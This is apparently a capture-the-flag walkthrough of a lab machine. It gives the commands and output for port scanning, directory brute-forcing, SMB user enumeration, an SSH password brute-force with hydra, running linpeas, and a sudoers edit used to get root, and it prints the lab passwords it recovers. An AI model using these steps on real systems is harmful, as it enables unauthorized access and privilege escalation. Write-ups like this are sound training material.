# Basic Pentesting

IP = 10.10.244.41

## Nmap Scan
```bash
❯ nmap 10.10.244.41
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-24 12:05 IST
Nmap scan report for 10.10.244.41
Host is up (0.30s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 47.58 seconds
```

## Directory Brute-Force using gobuster

```bash
❯ gobuster dir -u 10.10.244.41 -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.41
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/amass/subdomains-top1mil-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/24 13:02:08 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 318] [--> http://10.10.244.41/development/]
```

Listed Files
1. dev.txt
1. j.txt

Content of dev.txt
```txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
Content of j.txt
```txt
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

SMB enumaration using enum4linux
```bash
❯ enum4linux -a 10.10.244.41
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

Brute Forcing SSH with hydra
```bash
❯ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.2
[ssh] host: 10.10.244.41   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
```

Sharing Linpeas over scp 
```bash
❯ sudo scp /home/arrry/.github/cloned/PEASS-ng/linPEAS/linpeas.sh jan@10.10.244.41:/dev/shm
```

Executing it in victim 
```bash
chmod +x linpeas.sh
./linpeas.sh
```
Found /user/bin/vim.basics with perms
Add following lines in etc/sudoer
```txt
jan	(ALL:ALL) ALL
kay (ALL:ALL) ALL
```
Login as sudo
```bash
jan@basic2:~$ sudo -i
root@basic2:~# cd /home/kay
root@basic2:/home/kay# cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
